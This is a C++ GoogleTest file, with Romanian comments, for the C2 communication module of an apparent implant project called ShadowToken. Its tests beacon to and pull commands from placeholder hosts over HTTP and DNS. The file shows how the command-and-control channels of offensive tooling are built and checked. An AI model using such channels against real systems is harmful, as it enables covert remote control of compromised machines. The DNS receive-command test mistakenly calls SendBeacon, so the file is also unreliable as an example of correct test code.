#include <gtest/gtest.h>
#include "../../src/c2_communication/c2_http.cpp"
#include "../../src/c2_communication/c2_dns.cpp"

namespace ShadowTokenTests {

    // Test pentru trimiterea unui beacon HTTP către serverul C2
    TEST(C2CommunicationTest, HttpSendBeacon) {
        ShadowToken::C2_HTTP httpC2("c2.example.com", 60);
        
        // Testează dacă beacon-ul poate fi trimis și răspunsul este corect
        std::string response = httpC2.SendBeacon();
        ASSERT_FALSE(response.empty()) << "Beacon-ul HTTP nu a primit răspuns de la serverul C2.";
    }

    // Test pentru primirea unei comenzi prin HTTP de la serverul C2
    TEST(C2CommunicationTest, HttpReceiveCommand) {
        ShadowToken::C2_HTTP httpC2("c2.example.com", 60);
        
        // Testează dacă poate primi o comandă de la serverul C2
        std::string command = httpC2.ReceiveCommand();
        ASSERT_FALSE(command.empty()) << "Nu s-a primit nicio comandă de la serverul C2 prin HTTP.";
    }

    // Test pentru trimiterea unui beacon DNS către serverul C2
    TEST(C2CommunicationTest, DnsSendBeacon) {
        ShadowToken::C2_DNS dnsC2("c2dns.example.com", 120);

        // Testează dacă beacon-ul DNS poate fi trimis și răspunsul este corect
        std::string response = dnsC2.SendBeacon();
        ASSERT_FALSE(response.empty()) << "Beacon-ul DNS nu a primit răspuns de la serverul C2.";
    }

    // Test pentru primirea unei comenzi prin DNS de la serverul C2
    TEST(C2CommunicationTest, DnsReceiveCommand) {
        ShadowToken::C2_DNS dnsC2("c2dns.example.com", 120);

        // Testează dacă poate primi o comandă de la serverul C2 prin DNS
        std::string command = dnsC2.SendBeacon();
        ASSERT_FALSE(command.empty()) << "Nu s-a primit nicio comandă de la serverul C2 prin DNS.";
    }
}
